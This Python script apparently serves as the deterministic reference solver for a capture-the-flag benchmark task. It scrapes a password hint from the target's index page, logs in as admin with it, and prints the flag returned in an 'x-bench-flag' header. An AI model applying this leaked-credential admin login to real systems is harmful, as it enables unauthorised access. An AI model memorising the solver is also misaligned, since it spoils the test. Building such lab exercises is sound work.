#!/usr/bin/env python3
"""Deterministic driver: read the hint page, then POST /login and read the flag header."""
import argparse
import json
import re
import subprocess
import sys
from pathlib import Path


def ctfctl(challenge_dir: Path, ctfctl: str, *args):
    proc = subprocess.run([ctfctl, "-C", str(challenge_dir), *args], capture_output=True, text=True)
    if proc.returncode != 0:
        raise SystemExit(f"ctfctl {' '.join(args)} failed: {(proc.stderr or '')[-400:]}")
    return json.loads(proc.stdout or "{}")


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--challenge-dir", type=Path, required=True)
    parser.add_argument("--root", type=Path, required=True)
    parser.add_argument("--ctfctl", required=True)
    parser.add_argument("--target-url", required=True)
    args = parser.parse_args()
    challenge_dir: Path = args.challenge_dir

    index = ctfctl(challenge_dir, args.ctfctl, "tool", "http", args.target_url)
    body_file = challenge_dir / index.get("body_file", "")
    body = body_file.read_text(encoding="utf-8", errors="replace") if body_file.is_file() else ""
    match = re.search(r"pass=([A-Za-z0-9_]+)", body)
    if not match:
        raise SystemExit(f"hint not found in index body: {body[:400]!r}")

    login_url = args.target_url.rstrip("/") + "/login"
    response = ctfctl(
        challenge_dir, args.ctfctl, "tool", "http", login_url,
        "--method", "POST", "--data", f"user=admin&pass={match.group(1)}",
    )
    headers = response.get("headers") or {}
    value = next((v for k, v in headers.items() if k.lower() == "x-bench-flag"), None)
    if not value:
        raise SystemExit(f"flag header missing after login; status={response.get('status')}")
    print(f"FLAG={value}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
